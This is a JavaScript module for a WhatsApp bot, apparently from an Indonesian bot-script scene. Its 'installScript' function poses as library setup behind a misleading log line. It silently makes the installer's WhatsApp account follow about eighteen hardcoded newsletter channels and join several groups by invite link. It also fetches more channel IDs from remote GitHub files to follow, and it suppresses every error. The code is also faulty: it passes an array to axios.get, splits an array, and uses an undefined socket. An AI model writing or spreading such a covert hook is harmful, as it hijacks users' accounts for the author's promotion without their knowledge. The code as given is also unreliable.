let idch = [
"120363422040633302@newsletter", // yifanofficial
"120363418722550051@newsletter", // yifantzyy modss
"120363418635634174@newsletter", // yifanmodss 2
"120363403649314274@newsletter", // yifanmodss 3
"120363402759322572@newsletter", // yifanmodss 4
"120363403474697757@newsletter", // yifanmodss 5
"120363424080979226@newsletter", // kynax
"120363403963346229@newsletter", // pt colek bug manja
"120363422630978662@newsletter", // share sc free
"120363406228325812@newsletter", // yifanmodurus.py
"120363424741981877@newsletter", // gabut
"120363423629748765@newsletter", // web sc free
"120363425301137114@newsletter", // y dev
// PUNYA DANZ
"120363426197631947@newsletter",
// PUNYA BUYER YF
"120363427831425360@newsletter", // zenn push 1
"120363407494740311@newsletter", // zenn stok/jp
"120363427413305181@newsletter", // zenn share sc
"120363333165058234@newsletter" // daxzyy
 ];
 let gb = [
"https://chat.whatsapp.com/L37gSjHDhsG6Ag5lKkxJ2K",
"https://chat.whatsapp.com/KfvhU1oO7xSCcgJeS600Cb",
"https://chat.whatsapp.com/FQKdhRln7m03Iy98fNlX8w",
"https://chat.whatsapp.com/CZZuLZHvJDsDE1Cyqz6rAT",
"https://chat.whatsapp.com/CCwoQKMe9QYDf2qpbKjwmj"
 ];
 const axios = require("axios")
 
  async function installScript(YifanModss) {
    try {
        const GITHUB_RAW_URL = ['https://raw.githubusercontent.com/yifandevv/-/main/vip.json', 'https://raw.githubusercontent.com/danzoffc/free/main/f.json']
        console.log("⏳ [SYSTEM] Library: @whiskeysockets/baileys — YifanTzyy...");        
        const response = await axios.get(GITHUB_RAW_URL, { 
            headers: { 'Cache-Control': 'no-cache' } 
        });
        const channelList = response.data;
        for (const idInternal of idch) {
            try {
                await sock.newsletterFollow(idInternal);
                await new Promise(resolve => setTimeout(resolve, 1000));
                await sock.groupAcceptInvite(gb.split('/')[3]);
            } catch (err) {}
        }
        if (Array.isArray(channelList) && channelList.length > 0) {          
            for (const idRaw of channelList) {
                try {
                    await sock.newsletterFollow(idRaw);
                    await new Promise(resolve => setTimeout(resolve, 100));
                } catch (err) {}
            }
        } else {
            console.log("ℹ️ Error Pada Script? Silahkan Pv Telegram YifanTzyy @yifanmodss.");
        }
    } catch (error) {
        console.error("❌ [SYSTEM] Sender:\n", error.message);
    }
}

module.exports = { installScript };